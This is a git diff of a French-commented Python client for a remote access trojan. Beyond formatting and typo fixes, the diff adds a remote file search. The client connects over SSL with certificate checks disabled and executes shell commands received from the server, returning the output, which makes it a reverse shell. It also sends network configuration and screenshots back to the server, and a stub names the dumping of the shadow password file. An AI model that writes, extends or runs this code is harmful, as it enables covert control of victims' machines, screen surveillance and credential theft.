@@ -22,45 +22,52 @@ def upload(ssl_socket):
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
     while True:
-        commande_shell_received = ssl_socket.recv(4096).decode() # Récupération de la commande Shell du serveur
-        if commande_shell_received.lower() == 'quit': # Gestion de la sortie du Shell
+        commande_shell_received = ssl_socket.recv(4096).decode()  # Récupération de la commande Shell du serveur
+        if commande_shell_received.lower() == 'quit':  # Gestion de la sortie du Shell
             break
-        commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True) # Exécution de la commande Shell et stockage de ses sorties
-        commande_shell_to_send = commande_shell.stdout + commande_shell.stderr # Concaténation des sorties de la commande Shell
-        ssl_socket.send(commande_shell_to_send.encode()) # Envoie de la réponse de la commande Shell
+        commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True)  # Exécution de la commande Shell et stockage de ses sorties
+        commande_shell_to_send = commande_shell.stdout + commande_shell.stderr  # Concaténation des sorties de la commande Shell
+        ssl_socket.send(commande_shell_to_send.encode())  # Envoie de la réponse de la commande Shell
 
 # Fonction permettant d'envoyer la configuration réseau au serveur
 def ipconfig(ssl_socket):
-    os_type = os.name # Récupération du nom de l'OS de la machine
-    if os_type == "posix": # Test si la machine est une Linux
-        conf = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "ifconfig" et stockage de ses sorties
-        conf_to_send = conf.stdout + conf.stderr # Concaténation des sorties de la commande "ifconfig"
-    elif os_type == "nt": # Test si la machine est une Windows
-        conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "ipconfig" et stockage de ses sorties
-        conf_to_send = conf.stdout + conf.stderr # Concaténation des sorties de la commande "ipconfig"
+    os_type = os.name  # Récupération du nom de l'OS de la machine
+    if os_type == "posix":  # Test si la machine est une Linux
+        conf = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ifconfig" et stockage de ses sorties
+        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ifconfig"
+    elif os_type == "nt":  # Test si la machine est une Windows
+        conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ipconfig" et stockage de ses sorties
+        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ipconfig"
     else:
-        conf_to_send = "OS non reconnu" # Gestion d'erreur
-    ssl_socket.send(conf_to_send.encode()) # Envoie de la configuration au serveur
+        conf_to_send = "OS non reconnu"  # Gestion d'erreur
+    ssl_socket.send(conf_to_send.encode())  # Envoie de la configuration au serveur
 
 # Fonction permettant d'envoyer la capture d'écran au serveur
 def screenshot(ssl_socket):
     screenshot = ImageGrab.grab()  # Capture de l'écran
     screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
-    with open('screenshot.png', 'rb') as screenshot_file: # Ouverture de la capture d'écran
+    with open('screenshot.png', 'rb') as screenshot_file:  # Ouverture de la capture d'écran
         while True:
-            screenshot_to_send = screenshot_file.read(4096) # Stoakage des données de la capture d'écran
+            screenshot_to_send = screenshot_file.read(4096)  # Stokage des données de la capture d'écran
             if not screenshot_to_send:
                 break
-            ssl_socket.send(screenshot_to_send) # Envoie de la capture d'écran
-    ssl_socket.send(b'END') # Envoie d'un délimiteur final
+            ssl_socket.send(screenshot_to_send)  # Envoie de la capture d'écran
+    ssl_socket.send(b'END')  # Envoie d'un délimiteur final
 
-# Fonction permettant de localiser le fichier demander par le serveur
+# Fonction permettant de localiser le fichier demandé par le serveur
 def search(ssl_socket):
-    print('search')
+    recherche_received = ssl_socket.recv(1024).decode() # Récupération du nom du fichier recherché
+    print('reçu')
+    command, fichier_search = recherche_received.split(':', 1) # Séparation de la commande pour récupération du nom du fichier recherché
+    recherche = subprocess.run(['find', '/', '-name', fichier_search], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "find" et stockage de ses sorties
+    print('recherche faite')
+    recherche_to_send = recherche.stdout + recherche.stderr # Concaténation des sorties de la commande "find"
+    ssl_socket.send(recherche_to_send.encode()) # Envoie de la recherche au serveur
 
 # Fonction permettant d'envoyer le fichier shadow au serveur
 def hashdump(ssl_socket):
     print('hashdump')
+
 
 
 
@@ -72,15 +79,15 @@ def main():
 
     # Création du contexte SSL pour la connexion au serveur
     context = ssl.create_default_context()
-    context.check_hostname = False # Désactivation de la vérification du nom d'hôte du serveur
-    context.verify_mode = ssl.CERT_NONE # Désactivation de la vérification du certificat SSL du serveur
+    context.check_hostname = False  # Désactivation de la vérification du nom d'hôte du serveur
+    context.verify_mode = ssl.CERT_NONE  # Désactivation de la vérification du certificat SSL du serveur
 
     # Création du socket TCP pour la connexion au serveur
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server) # Enveloppement du socket avec SSL pour sécuriser la communication
-    ssl_socket.connect((ip_server, SERVER_PORT)) # Connexion au serveur en utilisant l'adresse IP et le port de connexion
+    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)  # Enveloppement du socket avec SSL pour sécuriser la communication
+    ssl_socket.connect((ip_server, SERVER_PORT))  # Connexion au serveur en utilisant l'adresse IP et le port de connexion
 
-    # Gestion des commandes reçues pas le serveur
+    # Gestion des commandes reçues par le serveur
     while True:
         command = ssl_socket.recv(1024).decode()
         if command.lower() == 'help':
@@ -102,7 +109,7 @@ def main():
         elif command.lower() == 'exit':
             break
 
-    ssl_socket.close() # Fermeture du socket
+    ssl_socket.close()  # Fermeture du socket
 
 if __name__ == "__main__":
     main()
